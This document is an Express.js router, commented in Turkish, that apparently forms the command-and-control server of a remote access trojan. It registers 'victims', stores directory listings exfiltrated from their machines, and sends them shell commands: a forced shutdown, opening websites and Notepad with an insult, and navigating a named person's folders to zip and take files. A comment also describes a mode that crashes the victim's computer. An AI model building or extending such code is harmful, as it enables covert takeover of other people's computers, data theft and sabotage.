const express = require("express");
const router = express.Router();
const User = require("../models/users");
const Victim = require("../models/victims");
const VictimDatas = require("../models/victimdatas");
const unzipper = require('unzipper');
const path = require('path'); // path modülünü ekleyin

const multer = require('multer');
const fs = require('fs');
const mongoose = require("mongoose");

// Dosya yükleme işlemi için multer ayarları
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, './uploads');
    },
    filename: function (req, file, cb) {
        cb(null, file.fieldname + "_" + Date.now() + "_" + file.originalname);
    }
});

const upload = multer({ storage: storage }).single('file');

// Dosya yükleme endpoint'i
router.post("/upload", (req, res) => {
    upload(req, res, function (err) {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        return res.status(200).json({ message: 'Dosya başarıyla yüklendi!' });
    });
});


// //insert an user into db
// router.post("/add", upload, async (req, res) => {
//     try {
//         const user = new User({
//             name: req.body.name,
//             email: req.body.email,
//             phone: req.body.phone,
//             image: req.file.filename,
//         });
//
//         await user.save();
//
//         req.session.message = {
//             type: 'success',
//             message: 'User added successfully!'
//         };
//
//         // Yönlendirme işlemi burada yapılmalı
//         res.redirect('/'); // Ana sayfaya yönlendir
//
//     } catch (err) {
//         res.json({ message: err.message, type: 'danger' });
//     }
// });
//
// //get all users route
// router.get('/', async (req, res) => {
//     try {
//         const users = await User.find().exec();
//         res.render('layout/index', {
//             title: "Home Page",
//             users: users
//         });
//     } catch (err) {
//         res.json({ type: 'danger', message: err.message });
//     }
// });
//
//
// router.get('/add',(req,res)=>{res.render("layout/add_users",{title:"Add Users"})});
//
// router.get('/edit/:id', async (req, res) => {
//     try {
//         let id = req.params.id;
//         let user = await User.findById(id).exec();
//
//         if (!user) {
//             res.redirect('/');
//         } else {
//             res.render("layout/edit_users", {
//                 title: "Edit User",
//                 user: user
//             });
//         }
//     } catch (err) {
//         console.error(err);
//         res.redirect('/');
//     }
// });
//
// router.post('/update/:id', upload, async (req, res) => {
//     try {
//         let id = req.params.id;
//         let new_image = "";
//
//         if (req.file) {
//             new_image = req.file.filename;
//             try {
//                 fs.unlinkSync('./uploads' + req.body.old_image);
//             } catch (e) {
//                 console.log(e);
//             }
//         } else {
//             new_image = req.body.old_image;
//         }
//
//         await User.findByIdAndUpdate(id, {
//             name: req.body.name,
//             email: req.body.email,
//             phone: req.body.phone,
//             image: new_image,
//         });
//
//         req.session.message = {
//             type: 'success',
//             message: 'User successfully updated!..'
//         };
//         res.redirect('/');
//     } catch (e) {
//         res.json({ message: e.message, type: 'danger' });
//     }
// });
//
//
// //Delete user route
// router.get('/delete/:id', async (req, res) => {
//     try {
//         let id = req.params.id;
//         let result = await User.findByIdAndDelete(id);
//
//         if (result && result.image !== '') {
//             try {
//                 fs.unlinkSync("./uploads/" + result.image);
//             } catch (e) {
//                 console.log(e);
//             }
//         }
//
//         req.session.message = {
//             type: 'success',
//             message: 'User successfully deleted from database.!!'
//         };
//         res.redirect('/');
//     } catch (err) {
//         res.json({ message: err.message, type: 'danger' });
//     }
// });

router.post("/rat/init", async (req, res) => {
    try {
        // desktopName'e sahip bir belgeyi bulun
        const existingVictim = await Victim.findOne({ desktopName: req.body.desktopName });

        // Eğer belge bulunursa, ekleme yapma
        if (!existingVictim) {
            // Belge bulunmazsa ekleme yap
            const victim = new Victim({
                desktopName: req.body.desktopName,
                created: Date.now()
            });

            await victim.save();

            res.status(200).json({  // 200 OK durumu ile birlikte JSON yanıtı gönderin
                status: 'success',
                message: 'victim added successfully!'
            });
            console.log("Birisi sisteme eklendi.")
        }

    } catch (err) {
        console.log("Error!!!!:" + err.message);
    }
});



//get all users route
router.get('/rat/popen', async (req, res) => {
    const not_defteri_ac = "echo gotveren ertugrul.com.  > mesaj.txt && start notepad mesaj.txt"
    const website_ac = "start www.14d.com"
    const bilgisayari_kapat = "shutdown /f /p" //force , immediately.
    const wifi_baglantisini_kes = "netsh wlan connect"
    const response = {
        username: "*",
        command: "",
        zorbamode:"false" // burayi true yaparsan bilgisayar %95 cokecektir. while true start command seklinde calisiyor.
    }
    res.send(response);
});


router.post("/rat/postdata", async (req, res) =>  {
    try {
        const victimDatas = new VictimDatas({
            username: req.body.desktop,
            data: req.body.allDirectories,
            created: Date.now()
        });

            await victimDatas.save();
            console.log(req.body.desktop + "'dan yeni datalar sisteme eklendi.")
        }
     catch (err) {
        console.log("Error!!!!:" + err.message);
    }
});
//get all users route
router.get('/rat/dos', async (req, res) => {

    let dosya_yolu_al_getir = "cd C:\\ && cd spring_projects && cd ziple && cd"
    const response = {
        username: "emirhan karakoc",
        command: dosya_yolu_al_getir,
        zip:"true"
    }
        res.send(response);

});




module.exports = router;